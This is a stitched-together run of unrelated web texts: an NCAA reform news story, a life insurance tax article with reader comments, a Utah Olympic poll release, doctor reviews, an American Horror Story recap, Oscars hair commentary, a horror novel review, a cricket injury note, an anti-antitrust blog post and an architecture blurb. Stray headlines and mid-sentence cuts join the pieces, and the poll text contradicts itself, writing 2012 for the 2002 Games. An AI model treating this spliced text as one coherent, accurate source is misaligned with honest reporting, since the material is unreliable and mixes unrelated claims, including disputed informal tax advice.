The board also will consider a proposal to allow conferences to increase their scholarships by $2,000 to more closely approach the full cost of attendance.
This money could be used for a flight home at Christmas, a pizza with friends or to help with the purchase of shampoo and other incidentals.
Major Conferences
Emmert said he expected all six major conferences -- Atlantic Coast, Big East, Big 12, Big 10, Pac-12, Southeastern conference -- “to adopt this right away. They have the revenue to do it.” He wants to make sure that schools aren’t dropping scholarships or sports to pay the additional cost.
Emmert said he’ll also ask the board to allow schools to offer multiyear grants, rather than annual scholarships. This would protect an athlete from having a scholarship taken away.
Other issues being discussed include revamping the NCAA rule book. Emmert said the rules are “laughably detailed” and don’t focus on the big picture.
“I and other university presidents were devastated” by rules violations at schools in the past year, Emmert said. “The lack of integrity, the scandals, all of that was annoying to the extreme. We recognize a lot of problems were self-inflicted. We have in place a set of rules on the wrong things.”
Emmert said the NCAA rulebook commits three pages to detailing the size of the envelopes that can be used to mail athletes promotional materials.
No Cream Cheese
He added that NCAA rules sometimes allow schools to provide recruits a snack, but not a meal. A bagel qualifies as a snack, he said, but once cream cheese is added, it becomes a meal and a potential violation.
Some parts of the rule book need to be re-written in “whole cloth” to focus on integrity issues, he said.
Other ideas Emmert is considering are shortening the seasons of some sports, reducing international travel and limiting the size of athletic department staffs that aren’t directly involved in coaching.
He also has a proposal requiring recruited athletes who fail to meet certain academic standards to sit out their freshman year and focus on class work.

Life Insurance Death Benefit.
Life Insurance Dividends
Here’s where things get a little tricky – life insurance dividends are only taxable if:
- The amount you receive in cash is more than the amount of premiums you have paid,
- You take the dividends as cash, as opposed to buy additional coverage,
- Your policy is a modified endowment contract, which is a special kind of policy, and you take cash.!{ 34 comments, please add your thoughts now! }
Good article, however it was a bit confusung when the article referred to “you”. As somtimes the “you” was the beneficary, and some times the “you” was the policy owner. Just to add to the confusion there are two additional parties in a life insurance policy, the insured, and the premium payor. Some times one person can act as more than one of the parties. I could be the owner and insured and my wife be the premium payor and beneficary.
At the end of the day it is the owner who controles all aspects of the policy while the insured is alive, and the beneficary controles every thing after the insured dies
While in general life insurance proceeds are not taxed, they are included as part of your estate and add to the value of it. If the value goes over the tax-free allowance, then they could be taxed at the current estate tax rate, which is around 35%-40%.
I beg to differ as proceeds from the insurance policy go to the beneficiary and will not be added to the insured’s estate.
This is why it is also called, ” The life insurance is not for you, it is for the family, the people you care about.”
I am an insurance examiner and I agree that with too many plans and various policies, it can be very confusing.
Both Mark P and Frugal are mostly correct about life insurance and one’s estate. Life insurance owned by the decedant at time of death is included in the valuation of the decedants estate, for estate taxes. While the insurance death benefit it self is generaly not estate taxed, it has the impact of boosting the estate value. Think of it this way , A 1M death benefit would be the foundation and a 5M estate would sit on top of it and the effect would be that more of the 5M portion, that part above the tax free allowance would be estate taxable. If the 1M death bennefit came from a policy owned by some one else, it would not boost the other 5M one bit. For the vast majority of us who have no estate tax issues regardles of the amount of or ownership status of life insurance, the estate tax question is moot.Of course every ones estate plan and tax suituation is different and I am NOT giving tax or legal advice BTW, I am a life insurance agent of 25 years.
I second Dave’s comment. Life insurance can increase your taxable estate if you were the owner when you died (or transferred it 3 years prior to death). If estate taxes are a likely problem for you, it’s best to have the beneficiary be the owner or use a trust.
Hopefully my son will be graduating from college in May. In thinking that the next few years are the years he is most likely to need help from me, I decided to take out an inexpensive term policy (I already have a small whole-life policy) to provide him with that support in the event something happens to me.
I was surprised to discover that my medical history (cancer 10 years ago, but cancer free ever since), while not precluding me from getting health insurance, made it impossible to get life insurance.
So, if you’re planning to get life insurance, you might want to get on with it while you are still healthy. Personally I’m for it. It’s not that expensive and in spite of your wife’s undoubted ability to take care of herself (and your ability to take care of yourself), all emotion aside, the unexpected death of a spouse is immediately financially difficult and helping to ease that difficulty is a nice gift you can give to each other.
Your group health insurance or personal health insurance didn’t care about the cancer? Big difference between the two.
saladdin
Agreed, start a policy now while you are still insurable and have a current need.
Not all ins companies will deny you coverage. while it may cost you more.. there are some that will cover you. As an agent I have 2 clients off the top of my head that are covered… with dr records.. (not all cancers will be excepted) and at least 2 years of remission.
As a working person who unexpectedly became disabled, while your wife may be capable of taking care of herself at this moment, what would happen if you died, and she became disabled at the same time or thereafter? And vice versa. SSD, if you can get on it, is barely enough to cover renting a room.
Just buy a 30 year level term policy and you won’t have to untangle all these details.
A rule of thumb for any financial instrument:The more complicated it is, the more money they are making off of you.
Sorry, but it is highly doubtful that any application for any amount of any form of life insurance would be accepted by a company with out thorough underwriting. Included in the underwriting would be evaluating the answers to all the medical and other questions on the application, a review of doctors records, and perhaps an exam including blood and urine. Yes some companies might accept applications for small face amounts or for young, <18Y, in some cases. Also some companies issue policies of limited amounts for older persons with out medical questions,they cost more and have exclusions and other limits. Term insurance requires all the underwriting that permanent polices do
The ads that want you to get life insurance on a newborn infant freak me the hell out.
saladdin
I second that thought. Insurance should benefit the dependants not be on the dependants lives.
We added both our kids to my policy with a $10,000 benefit each shortly after they were born. I don’t like to think about them dying before me, but if one of them did we would be able to cover funeral expenses or any medical bills that might be owed. It cost about $10.00 per year per kid to add them on to my term policy. Again, not something I want to think about, but it’s about being prepared for the worst.
But the odds are your kids will grow up to be healthy, divorced adults. Wouldn’t medical bills be covered by your health insurance and why not self insure for burial?
saladdin
I agree with Saladdin on this one.
it is not just about if your child dies.. if they become terminally ill.. and you had them previously covered as a child rider.. they can not be denied coverage.. up to 5X the coverage. at least though us.. there are options for people.. you should smartly plan for the future.. both the worst and best side.. its closed minded to believe that you will be the person or family that nothing happens. All families all say the same thing.. “I’ve heard of this happening.. but you never believe that it will happen to you” better to be prepared then doing the I WISH game.
I never understood this – and it is probably the opposite of most people reading bargaineering…why ONLY $10,000?
Are you really going back to work 40 hours the week (or 3 weeks if you have enough vacation time saved up) after your child dies?
If Jim allows:
After having my son experience this, I think it’s wise. Making financial decisions after a child has died is really tough–parents want kids to have the best funeral possible (in my experience), which is expensive. Our granddaughter’s funeral was about $10,000. My son had taken out a small life insurance policy much like the one you mention.
We took out Globe Life insurance policies for $5,000 for each of the grandchildren when they reached one year old. This was intended to help their parents with final expenses if the child were to die. At $20 per year, it’s a small price to pay for a certain degree of peace of mind and if it’s never paid out, so much the better.
I’m in the fortunate position of having a small life insurance policy on both my wife and my child through my employer, covered at no extra cost to me. Not sure how I would feel about paying for it, myself, as the benefit is for only $5,000, in each case, but I do know that I feel better having it. If either were to pre-decease me, I don’t know how much of a mood to coordinate expenses I would be in.
Under IRC Section 2042,
“The value of the gross estate shall include the value of all
property -
(1) Receivable by the executor
To the extent of the amount receivable by the executor as insurance under policies on the life of the decedent.
.”
This area of the life insurance can get very complicated very fast if you transfer the policy for value which would make the death benefit income taxable to the receipent.
There are also instances when life insurance owned by a 401(k) plan where a part of the policy (mainly the CSV) would be taxable.
I am an attorney that works in a financial planning firm – the above sections are not usually known/understood by those in the industry.
I believe most of the people will not be subjected to IRC section 2042.
Also keeping it simple, the interest in your post will be taxed as it is an income upon receipt and naturally, any asset owned (receivable in any capacity) should be included in the estate as long as you own it.
“I believe most of the people will not be subjected to IRC section 2042.”
Why? Because they won’t meet minimum thresholds of Estate Tax ($3.5mil in 2009; unlimited thus far in 2010)?
What about State Estate Taxes? 18 States and DC have them. In New York that amount is $1,000,000 in NJ it is $675,000
So, after reading the article and comments I see this is a complicated subject. Thanks to everyone for explaining the tax implications.
As for myself, I have life insurance…I don’t have any dependents but in any case someone would have to pay for my funeral and I wouldn’t want them to be left holding the bag.
I assume your coverage is minimal (funeral expenses) and if more than that you have beneficiaries depending on you?
I had been told before by my company’s benefits coordinator that they won’t take out life insurance premiums pre-tax (cafeteria style), because if you use pre-tax dollars, the benefit is taxable….
Don’t know how much truth there was to that, but I elected to pay the tax on the $10/mo as to not screw up BIG time on the benefit…
Who pays the premium does help determine taxable status.
Surprises me. Cafeteria plans favor the business. They save on taxes etc… I wonder if your coordinator really understands how they work.
Funny story. I had printed off a “How Cafeteria Plans Work” booklet off the net this week and had it sitting on my table at home. My girlfriend walks by and says “Your work is getting a cafeteria?” I just looked at her and said “Not the food kind.”
She’s a good one.
saladdin
That is great! Had my wife seen a book like that, I guarantee she would have said the same thing!!!
Mike – it wouldn’t surprise me if you coordinator was clueless.
My wife’s employer (thousands of employees) recommends, on their web site, paying for disability insurance with after-tax money “because it is unlikely you will become disabled.” Those are their words, not mine.
Yes, they’re suggesting that you save a few dollars a month in taxes now and possibly incur hundreds of thousands of taxes in the future.
My own employer smartly avoids giving tax advice – particularly bad tax advice.
Correction: wife’s employer recommended using PRE tax money. Using after tax money is, of course, the correct method.. That may not apply to married couples, at least if you’re in a community property state; dunno, but might be wise to look into it.
Consider life insurance for your spouse, especially if she’s a SAHM. Price out what it would cost to put your kids in day care or have a caretaker in your home, to hire someone to schlep them to practices and other extracurricular activities, to clean house and prepare meals, and to run all the errands she’s doing while you’re at work. Now multiply that times the several years it may take you to recover from widowhood and find a new wife, add the cost of burial and the cost of therapy for yourself and the kiddies, and you’ve got the amount for which she should be insured.
.”
This is wrong – there may be gifting issues, but it depends who owns the policy (adult child vs. a for profit company).
I completely agree with on the SAHM issue.Bible college president faces forced labor charge

Conducted in partnership by Dan Jones & Associates and the David Eccles School of Business from January 23 to January 25, the survey shows strong public backing for a future bid, possibly in 2026. Moreover, the poll results appear to be consistent with the direction of Utah’s leadership—the Utah Olympic Exploratory Committee, under the guidance of Governor Gary Herbert, has unanimously recommended that Salt Lake City pursue a bid in 2026, should the U.S. Olympic Committee (USOC) submit a bid.
“Residents can see what Utah gained from hosting in 2002,” commented Dr. Dan Jones. “The Games spurred the development of Utah’s infrastructure. We have Olympic-ready facilities along the Wasatch Front, and positive media exposure has bolstered tourism growth and the overall state economy.”
The data comes from the inaugural monthly survey launched by Dan Jones & Associates and the David Eccles School of Business. The Utah Business Sentiment Survey provides a monthly indication of business conditions, policy preferences and current issues facing the state of Utah. The most recent survey was completed by 1,622 Utahns. It focused on the public perceptions of the benefits of Utah hosting the 2002 Winter Olympics and support of Utah making a bid to host a future Winter Olympics.
Here are the results:
Benefit and Support of Hosting the Winter Olympics
To what degree has Utah benefited from hosting the 2002 Winter Olympics?/Answer (%)
- Strongly benefited 47%
- Benefited 45%
- Neither benefited nor hurt 6%
- Hurt 1%
- Strongly hurt 0%
To what degree would you support Utah making a bid to host a future Winter Olympics, such as in 2026?/Answer (%)
- Strongly support 46%
- Support 36%
- Neither support nor oppose 11%
- Oppose 6%
- Strongly oppose 3%
Other interesting findings include the following:
• 96 percent of Republicans believe Utah benefited from hosting the Winter Olympics in 2012. This figure is slightly greater than that of Democrats (89 percent) and Independent Voters (90 percent). Of those who consider themselves on the conservative side of the political spectrum, 95 percent believe the state benefited from hosting, compared to 87 percent of those who consider themselves to be on the liberal side.
• 88 percent of Republicans would support Utah making a bid to host a future Winter Olympics. This percentage is noticeably higher than the 74 percent of Democrats and 77 percent of Independent Voters who would support a bid. On the political spectrum, 85 percent of conservatives would support Utah making a bid for the Winter Olympics, compared to 71 percent of liberals.
• Ostensibly, the vast majority of Utahns feel that hosting the Winter Olympics in 2002 benefited the state and its residents. A dominant portion of Utah residents would support Utah making a bid to host again in the future. These sentiments are relatively consistent with residents throughout all age groups, income and education levels, and ethnicities.
Survey participants, including responses from 1,622 Utahns, originate from a database of Utahns by mail, landline telephone, cell phone and e-mail.
“Hosting the Olympics again is a serious endeavor by any measure,” said Natalie Gochnour, an Associate Dean at the David Eccles School of Business, which partnered on this survey. “A bid would require our best financial, environmental and community stewardship, but clearly the public supports another bid.”
Plans are currently moving in the direction of a future Olympic bid. The USOC has decided not to pursue the 2022 Games, but the potential exists for Utah to host in 2026. Utah possesses strengths that would make it a logical choice for hosting in 2026—Utah’s facilities are routinely utilized by world class athletes, the local economy is comparatively strong, and the state’s infrastructure is likely more apt for hosting a successful Winter Olympics than other cities considering a future bid.
“The vast majority of Utah residents think hosting in 2002 was a victory and this sentiment is even seen among those who weren’t living in Utah at the time of the games” said Dr. Jones. “It’s very rare that you find 92 percent support for such a large public endeavor.”
Hosting the 2002 Winter Olympics had positive effects on Utah’s economy that are still felt today. The world saw what Utah has to offer, and tourism has increased significantly as the state is now viewed as an elite destination for winter sports. Randy Shumway, President and CEO of the Cicero Group, commented, “The most considerable effect of hosting the Olympics in 2002 and hosting again in the future is job creation. Improving the infrastructure, creating new facilities, and preparing for the influx of people creates more and more jobs for Utahns. Hosting again will improve Utah’s tourism industry, making it even more robust than it is already. In addition to enjoying the spectacle and fun of the Olympics, the majority of Utahn’s have seen what hosting in 2002 has done for the state and are eager for another opportunity.”Season 2, Episode 14 Forget-Me-Not

He definitely has the attititude that is God's right hand man and poorly comunicates with his patients because of his pompous higher than thou attitude I would NOT reccommend this clinic especisally Dr. Chandler:{
I had several injections for neck pain over six months that did little to relieve my pain. After the last injection in April 2011, I discovered when I got home that the port & needle had been left in my arm. It was after 5 PM on a Friday. I pulled the needle out with blood spraying out forcefully. When I reported this at the next appointment, Dr. Chandler checked the medical record which indicated that the needle had been removed by the nurse. I ordered my medical records that stated that Dr. Chandler had spoken with the staff & that the needle had been removed. He filed an incident report. But when I called his office to get that report of what had actually been said & reported by the staff, I was denied access to the incidentt report. I feel that the staff lied to him! Dr. Chandler, I trusted you! And I will never go back to this clinic.
Fantastic doctor. Tough but extremely intellegent and focused. Goes above and beyond his duties as a physician. He performed a kyphoplasty on me in 2006. Would recommend him to anyone who has a tricky medical problem.
Can never get you in on time. MOST OF THE TIME 1 HOUR . Very poor bedside manner.
Dr. Chandler has a good bedside manner, accurate is his practice, will take time as needed in the office, and has helped me tremendously with cronic pain. His staff is also very caring and helpful. I rate him excellent!This is a fair warning to anyone who is reading this and hasn’t been keeping up with our American Horror Story recaps: turn back now or risk ruining some fantastic surprises from this series. When last we left the Harmon house, we learned that Vivien’s (Connie Britton) twins had, not one, but two fathers. We also watched as Ben (Dylan McDermott) came to certain revelations about the house and its inhabitants. Hayden (Kate Mara) was up to her old tricks again and ill-advisedly added a new member to the ghost line-up: Travis (Michael Graziadei). The episode “Spooky Little Girl” ended with a spoon-fed foreshadowing of the birth of Vivien’s demonic (read: antichrist) baby. But what have the other kids, Violet (Taissa Farmiga) and Tate (Evan Peters) been up to? Hit the jump to find out.
[The following episode recap contains spoilers.]
Last week in the comments section, you guys brought up the idea that Violet was, in fact, dead, having actually overdosed on pills (rather than the assumption that Tate had saved her). Well, it appears creators Brad Falchuk and Ryan Murphy gave us the answer to that discussion this week on “Smoldering Children.” But as it happens late in the episode, we’ll save that until last.
No major guest stars portraying famous murder victims this week, but we do start off by jumping back to 1994. The familiar faces of Tate, Adelaide (Jamie Brewer) and Constance (Jessica Lange) are at the dinner table with an unexpected figure at the head. Larry (Denis O’Hare) has brought the Langdons into his home after his wife, Lorraine (Rebecca Wisocky) burned herself and their children, Margaret and Angela, to death. Tate doesn’t take Larry’s advances lightly as he knows Larry was the one who killed his brother, Beau (Sam Kinsey). After a fight between Larry, Constance and Tate, the still-alive teenager storms out, promising to “never be your perfect son.” Tate not only stocks up on his arsenal (after a few hits of coke) on the way to school, he also stops by Larry’s office, douses him in gasoline and sets the man ablaze. (I love AHS’s opening sequences.)
Now we’re back to the funny farm where Ben is visiting Vivien to tell her the truth about the twins, a fact that led him to believe she wasn’t crazy and that she was indeed raped. Out of the frying pan and into the fire, so to speak (Sorry, Larry).
Also in hot water is Constance, as two detectives come calling in search of clues to the Travis’s death. Due to the manner of his passing, the media has dubbed him the “Boy Dahlia.” Constance isn’t the only one dealing with the cops, as a truant officer shows up at the Harmon house to notify Ben of Violet’s delinquency and impending date with the court. The officer also draws attention to the swarms of blowflies in the room, to which Ben says he’ll call an exterminator.
As this episode jumped around even more than most, I’ll try to sum up the big parts from here on out. Constance and Larry played a big part of “Smoldering Children” so we’ll continue there. After the visit from the cops, Constance pays a visit of her own to Larry. Though she plays innocent and wounded at first, she presses a knife to Larry’s throat and says she knows he killed Travis. Larry confesses to moving the body (or, at least its pieces) but did not kill him. There’s a great line here, when Constance says, “Even dead, even a boy, he’s twice the man you are.” And Larry replies, “Well, he is now.”
In a frenzied state, Constance returns home to find the cops waiting for her. She accidentally drops the knife in front of them and they haul her down to the precinct. After a round of questions about the numerous tragedies that have befallen her (and a great flashback of Constance shooting her cheating husband, Hugo (Eric Close) and grinding his body up for puppy chow), Constance is saved by a lawyer. He advises her not to say any more, as the cops are looking for someone to pin the “Boy Dahlia” murder on and take the spotlight.
Larry, meanwhile, is obviously hurt by Constance’s repeated refusals to accept his advances. He skulks around the Murder House’s basement, fishing in the walls for Travis’s clothes and the murder weapon: evidence. As he does, Travis shows up to discuss the news coverage of his death and Constance’s reaction, and we get our first look at the title characters. Margaret and Angela, Larry’s burned children, are sitting at a table with a tea set. As Larry watches Travis join them, his scorched wife appears by his side. When he asks Lorraine why he’s seeing her now after all this time, she replies, “You’re almost ready now. You’re on the cusp.” (Perhaps this is similar to Ben’s progression, although Larry’s problem is unrequited love while Ben’s issue is too much bang-bang.) Before he leaves, Lorraine tells Larry that none of this is Constance’s fault, but rather his own.
Constance and her attorney are summoned to the police station again and for a moment we get the feeling that Larry has set her up. Quite the contrary, as Larry has confessed to Travis’s murder. In a conversation in prison, Larry speaks to Constance and asks her to say she loves him one last time, claiming that if he can hear that, he can survive anything. She says, “You’re going to die in here.” and walks away.
Now, onto the more exciting arc of the show. Ben is trying to determine the identity of the man in the rubber suit. He’s also trying to get Violet enrolled in a new school and deal with an exterminator on top of everything else. Tate handles the exterminator in his own personal way, pumping the toxic gas into the man’s mouth when he accidentally stumbled onto something horrific in the house’s crawlspace. (Should we expect an exterminator ghost? Or did you hear him calling for help like I did when Larry was fishing for evidence in the wall?)
Now that the exterminator is out of the way, Tate has to deal with the problem of Violet going back to school and Ben attempting to split them up. The first part is easy: he seduces Violet into staying with him just one more day. The second part is harder: he dons the rubber suit again and attacks Ben in the bathroom. The two have a pretty good knock-down, drag out fight, with Ben revealing Tate’s face just before Tate drugs him into unconsciousness.
Now, without Ben to protect her, Tate seemingly convinces Violet to commit suicide with him so that they’ll be together forever. Violet, thankfully, is too sensible for this and tricks Tate and manages to escape him and the house. There is a great scene where Violet is screaming for help outside, only to be ignored by nearby pedestrians (although the dog clearly hears her). Then, once Violet hits the border of the property, she’s portal’d back into the house. We watch this Scooby-Doo scene for a few minutes where every door out leads her back in, until she gets all tuckered out. She says, “Please, Tate. I don’t want to die.” To which he replies, “It’s too late for that.”
In easily the creepiest moment so far, Tate takes Violet down to the crawlspace to show her her own dead, curled-up, fly-infested corpse. I’ve seen a lot of movie/TV corpses, but this one was downright morbid and creepifying. The two have a dialogue that confirms what our crafty commenters already knew: Violet was indeed dead, having overdosed. Tate tried to make her commit a second suicide to save her from the horrendous truth.
And that, my fellow American Horror Historians, is where we leave “Smoldering Children,” with one of the most bizarre love…parallelograms on TV this side of soap operas. (Honestly, this really is just a soap opera with a macabre spin. And I’m okay with that.) What will happen when Ben regains consciousness? How much like Romeo and Juliet will Violet feel once she’s learned that Tate banged his mom and is the father of one of her babies? How will Vivien respond to choosing between leaving the house or her daughter, Violet? Just how many more ghosts can this place hold, anyway?
Next week on “Birth,” it looks like we can expect…well, a birth! But it looks like all the ghosts in the house have their own plans for the Harmon twins. Tune in next week to check out the recap!Greg, On Wed, Dec 29, 2010 at 4:50 PM, Greg Hellings <greg.hellings at gmail.com. > My point still stands.

But it's eye-opening to talk to someone who's used to seeing, and critiquing, the looks first hand. So StyleList called in the expertise of Nancy O'Dell – the entertainment journalist and red carpet mainstay -- for her exclusive commentary on the best tressed stars at the 2010 Academy Awards. O'Dell was on the town tonight, rubbing elbows with the stars at many an Oscar party.
As the new spokesperson for Rusk Professional Hair care, O'Dell dishes on who rocked their locks, and Rusk creative team lead stylist, Sherri Jessee, gives us tips on how to achieve each look.
Best Overall Hair: Sandra Bullock
Not only did Sandra Bullock take home the Best Actress prize -- but she also nabbed O'Dell's best hair nod. "Gorgeous, sleek, shiny hair, it's very soft feminine with an ever so slight curl at bottom, said O'Dell. "It has the perfect amount of height and structure. Such a classic look, almost Old Hollywood, but made it her own!
The most important aspect to this look? Bullock's glossy hair. "For this shiny, healthy look, you must begin with great hair color," says Jessee. "Just look how shiny and gorgeous Sandra's color is! For her role in "The Blind Side" she was blonde, however, this amazing deep, rich color looks a
Most Daring Hair: Sarah Jessica Parker
Parker is getting accolades for her big, sculptural bun, and O'Dell agrees. "A sleek updo with a large bun in the back, it's very architectural," said O'Dell. "Her hair almost looked like a bow made from hair. If it were anyone other than Sarah Jessica

This gravity defying hairstyle, is very of the moment, says Jessee. "Creating objects such as bows from the hair are actually a hot trend right now and have been featured by trend icon of the moment, Lady Gaga!" The Hollywood trick? Extensions, to add volume and length to the hair. "Extensions are widely available now in human hair and can easily be matched to your own hair color," says Jessee. Once you've clipped them in, begin with a pony tail spit into two even sections. Gently bend the side sections over and pin to form each of the two sides of the bow.
Best Updo: Miley Cyrus
"Simple, sweet and so elegant for such a wonderful young talent," said O'Dell. "Miley continues to get it right, from her clothes to her hair. Miley's UpDo is a new classic and really showcased her face. Her hairstyle was perfect without looking "constructed"
The key to Cyrus' look? Lots of gravity-defying volume, starting in the shower. "Using a volumizing shampoo, like Rusk Designer Collection "thicker" Thickening Shampoo, is critical to create thickness and volume," says Jessee. "A lightweight conditioner (preferably one designed for fine hair) is also essential to help keep the hair weightless rather than weighted down."

Best Male Hair: Zac Efron
As for the guys, Zac Efron gets the now with his choppy locks "Lots of texture! It was messy without being a mess," says O'Dell. "Very stylish, very young, and very modern. Zac's look was hip and perfectly frames his adorably handsome face."
Jessee suggests enhancing Efron's choppy texture with a firm hold gel or styling paste, like Rusk Wired Flexible Styling Creme. "This is an extra-strength styling creme that bulks up the texture of the hair and gives gravity defying hold," she says.
Best Tressed Couple: Penelope Cruz and Javier Bardem
"Penelope incorporated one of the trends of the evening – architecturally inspired hair, but without looking too constructed,"says O'Dell. "Her hair up is feminine and goes well with that amazing dress, and we all know that hair can make or break a dress. Javier's look is cool, carefree and suits his style. Overall, Penelope and Javier are a great looking couple and I always look forward to seeing them together."

Tonight Penelope was actually a bit low key, with her thick mane tied back into a classic, chignon, said Jessee. "The key here is to use a light finishing spray, like Rusk W8less Plus, while teasing hair at the roots to give lift and then gently smooth hair back and form a loose bun. Javier's softly layered hair that can be controlled perfectly with a small dollop of Rusk Jel FX firm holding gel."

Author Sarah Crowe is under a lot of pressure to turn in a new novel. Recent tragedy in the form of her girlfriend’s death by suicide has not only put a tremendous strain on her, it has also cursed her with writer’s block as grief seems to be the only item in her mental inventory. To clear her head, begin the healing process and actually have a novel to turn in to her publisher, she retreats to a New England farmhouse where she should find the peace and quiet that she needs, instead her mental state only weakens as generations of horror on the property are revealed to her.
Kiernan, a resident of Providence, Rhode Island has fully embraced the New England horror aesthetic. Evident in much of her work, short stories and novels, is a heavy dose of H.P. Lovecraft, an element that exists in just about every good horror author at work since the emergence of Lovecraft’s own fiction. But there’s a new element at work here or maybe I’m just noticing it for the first time. It often seems in the pages of The Red Tree as though Stephen King comes into play, as much of the main plot device revolves around the same mechanics that power The Shining. This is not to say that she saturates every passage in borrowed prose and phrases, quite the contrary. Kiernan’s writing is her own and very original, something hard to find in contemporary horror fiction. King and Lovecraft’s contributions to the overall narrative come in the form of thematic elements, as though she’s cherrypicking their finest qualities and wrapping them up in her own sometimes excessively purple prose.
The Red Tree operates efficiently, wasting no time, as a good novel should and among this lean piece of horror fiction is her greatest weapon. Kiernan puts to use one of Lovecraft’s best moves, a device that some of the finest horror filmmakers remember to fall back on. She allows your mind’s eye to fill in the gaps, giving you just enough description to get the wheels turning but baiting your imagination with the right fuel to scare the crap out of yourself with. What’s more, Kiernan is getting very good at it.
Protagonist, Sarah Crowe, often comes off as slightly autobiographical as much as Stephen King’s Jack Torrance of The Shining oftens rings sharply with King’s own career anxieties and since it’s Kiernan’s style to pack her pages to the rafters with damaged goods, so too is The Red Tree cast with a gallery of fatally flawed individuals. We come dangerously close to Poppy Z. Brite territory with some of these people, but where Poppy’s heroes are often so haunted it hurts, Kiernan designs the people who live in her pages with an uncommon sophistication and dimension. Not to put too fine a point on it, but they often feel like real people.
Though, it’s not my favorite Kiernan novel, an honor belonging to Daughter of Hounds, The Red Tree is quite an achievement and carries on Kiernan’s grand tradition of compelling narrative and the sort of eldritch horror found in the pages of Arkham House publlications. Though I often feel out of touch with the horror lit community, Kiernan still seems to live in the shadow of relative obscurity, evangelized endlessly by those fortunate enough to set their eyes upon her written page. The Red Tree takes Kiernan to the next level, familiar to those well-acquainted with her writing, but an altogether new approach. She smooths the corners and constructs a tighter novel than she has written thus far, deftly combining the best ingredients of modern horror to create a well-rounded package of psychological thrills that will hang out on the edges of your own consciousness begging to question, “Is Sarah Crowe the ultimate unreliable narrator?”
Existing outside of her magnum opus Chance Matthews series, The Red Tree is as good a starting point as any to introduce yourself to the dynamic work of Caitlin R. Kiernan.

good review..she is by far my #1 fav writer! you should review daughter of the hounds! that book was the ballsAustralia have been handed a boost ahead of the third Ashes Test in Perth with the news that fast bowler Ryan Harris will be fit to face England.
There were concerns over a shoulder injury that he picked up during the second Test in Adelaide, during his side's innings-and-71-run defeat, but scans have given him the all-clear.
He picked up two for 84 to comfortably emerge as Australia's most impressive bowler during England's only innings of 620 for six.
He has only just returned from a lengthy lay-off due to a knee injury and his fitness means Australia will have only one enforced change due to Simon Katich's Achilles problem, which has ruled him out of the series.
Phillip Hughes, Phil Jaques and Shaun Marsh appear to be the main candidates to replace the left-hander at the top of the order.
Australia are expected to confirm their squad on Friday (10th December).

- The New York Antitrust Division is looking to hire a new director. The division has become increasingly in prosecuting corporations.Tim Brinton / Newsart.comView Caption
The Justice Department is seeking a new chief for the New York office of the Antitrust Division. Since this is a “Senior Executive Service” position, applicants must demonstrate not just technical qualifications, but also “Executive Core Qualifications” defined by the Office of Personnel Management: an organization’s vision, mission, and goals. Inherent to this ECQ is the ability to provide an inclusive workplace that fosters the development of others, supports employee diversity,.
The goal of the ECQs, according to OPM, is a “results driven, customer focused, team oriented Federal Government.” I’m skeptical. The Antitrust Division is a particularly poor showcase for all these wonderful-sounding ECQs.
The basic problem is the Antitrust Division has no “customers.” The Division’s core “product” is coerced guilty pleas in price-fixing cases. There are “revenues” in the form of criminal fines, which have been steadily increasing every year. There’s also prison sentences for individuals convicted of price-fixing, which isn’t exactly a consumer product — and taxpayers lose money on that deal since they’re forced to pay the costs of incarceration.
Turning to the particular ECQs, the first item — “Leading Change” — seems irrelevant. The Antitrust Division’s “organizational vision” is fairly simple: Increase fines and prison sentences every year. I don’t see where there’s room for “strategic change,” particularly at the level of a field office director.
The second item, “Leading People,” is interesting not so much because there’s anything remarkable here — it’s all standard MBA-speak — but because it contradicts a key tenet of the Antitrust Division’s mission. Note the ECQ states the executive “facilitates cooperation and teamwork, and supports constructive resolution of conflicts.” That’s more then a little ironic — after all, the Antitrust Division’s purpose is to create and maximize conflict, both between businesses and the government, and between businesses themselves.
The Antitrust Division’s key program is its “Corporate Leniency Policy,” which in the Division’s own words spurs a “race to the prosecutor” by firms to obtain a full pardon in exchange for implicating competitors in illegal “price fixing.” The Division uses the pardon recipient’s accusations to coerce guilty pleas from competing firms and individual executives. The Division is generating conflict for its own sake, as evidenced by one senior Division official’s recent remarks:
Over the last three decades sanctions imposed in cartel cases brought by the Antitrust Division have increased exponentially. This increase is attributable to a number of factors, including increases in maximum penalties for antitrust crimes,. In the mid-1990’s the amount of corporate fines began to grow steadily, with multimillion dollar fines becoming more commonplace. and this trend shows no signs of decline, with the Antitrust Division obtaining just over $1 billion in fines in Fiscal Year 2009.
This is not “constructive resolution of conflicts.” It’s destructive generation of conflict that removes valuable capital from the marketplace — remember, all that fine money goes straight to the U.S. Treasury — while raising business costs as firms struggle to keep up with the Division’s exponentially increasing aggression.
Of course, I suppose this addresses the third ECQ — “Results Driven” — in that the Division is 100 percent driven by results. That said, this ECQ also says managers must “make decisions that produce high-quality results by applying technical knowledge, analyzing problems, and calculating risks.” There’s no real risk-calculation in antitrust, because there’s no consequences for failure. Sure, you might have a case go to trial and lose — it happens, albeit rarely — but no manager will be disciplined and the Division won’t face a lost of customer support because, hello, there are no customers.
As far as the Antitrust Division is concerned, “there are no false positives,” as Christine Varney, the current head of the Division, said, and thus no risk a decision will have any negative costs. Whether a department head carefully analyzes his decisions or simply throws darts at a board to pick his targets, it really doesn’t matter.
This also speaks to the fourth ECQ, “Business Acumen.” While even government offices have limited budgets and resources to manage, there’s no incentive to do so “strategically,” since there’s no possibility of failure.
The final ECQ — “Building Coalitions” — may sound innocuous but, in many respects, is the most disturbing of all. What we’re really talking about here is bureaucratic turf-building. The more domestic and foreign agencies you ally yourself with, the more insulated you become from the “customers” you claim to serve. I noted this in my earlier post on the International Competition Network, and I’ll cite another section here from the Antitrust Division speech I referred to above:.
So “building coalitions” means colluding with foreign governments to help imprison more of their own citizens — in a hostile foreign country — which further increases the burden on the Antitrust Division’s “customers” to support these extended criminal prosecutions and incarcerations.
If the Antitrust Division were held to any sort of truth-in-advertising standard, it would define the qualifications for its new bureau chief more succinctly: “We seek a borderline sociopath with a law degree who enjoys prosecuting people for fun — especially foreigners.” You might actually get more applicants with that.24 November 2010

Sou Fujimoto is the creator of a masterpiece: the Wooden Hut.
In this 15, 13 sq.m. cube-shaped mountain shelter, cedar wood timbers establish the only rule that fulfills all the following functions: exterior and interior walls, ceiling and floor, furnishing and stairs, even window frames. In fact, this unique mountain cabin is basically conceived by stacks of 350mm square timbers, joined together.
The interior space was obtained by extracting various wooden pieces, revealing no separations between floor, wall and ceiling. Only a little (kind of!) four walled space is left for bath and toilet placed on the ground floor, near the entrance.
This wooden fragmented cube presents an open spatial structure that provides its dwellers with various possibilities: what was first conceived as a stair becomes a chair, or a bed for an afternoon nap.
